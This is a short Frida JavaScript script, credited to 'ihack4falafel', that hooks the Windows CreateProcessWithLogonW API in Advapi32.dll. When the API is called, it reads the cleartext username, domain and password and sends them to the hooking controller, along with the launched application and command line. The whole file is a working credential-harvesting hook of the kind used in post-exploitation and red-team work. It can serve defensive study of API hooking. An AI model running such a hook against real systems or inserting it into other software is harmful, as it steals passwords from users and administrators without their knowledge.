// Base code taken from ihack4falafel

var pCreateProcessWithLogonW = Module.findExportByName("Advapi32.dll", 'CreateProcessWithLogonW')

Interceptor.attach(pCreateProcessWithLogonW, {
    onEnter: function (args) {
        send(JSON.stringify({
            type: "log",
            from: "CreateProcessWithLogonW",
            data: {
                text: "CreateProcessWithLogonW API hooked!",
                type: "INFO"
            }
        }));
        // Save the following arguments for OnLeave
        this.lpUsername = args[0];
        this.lpDomain = args[1];
        this.lpPassword = args[2];
        this.lpApplicationName = args[4];
        this.lpCommandLine = args[5];
    },
    onLeave: function (args) {
        send(JSON.stringify({
            type: "log",
            from: "CreateProcessWithLogonW",
            data: {
                text: "Retrieving argument values..",
                type: "INFO"
            }
        }));
        send(JSON.stringify({
            type: "data",
            from: "CreateProcessWithLogonW",
            data: {
                credentials: {
                    Domain: this.lpDomain.readUtf16String(),
                    Username: this.lpUsername.readUtf16String(),
                    Password: this.lpPassword.readUtf16String()
                },
                otherData: {
                    Application: this.lpApplicationName.readUtf16String(),
                    CommandLine: this.lpCommandLine.readUtf16String()
                }
            }
        }));
    }
});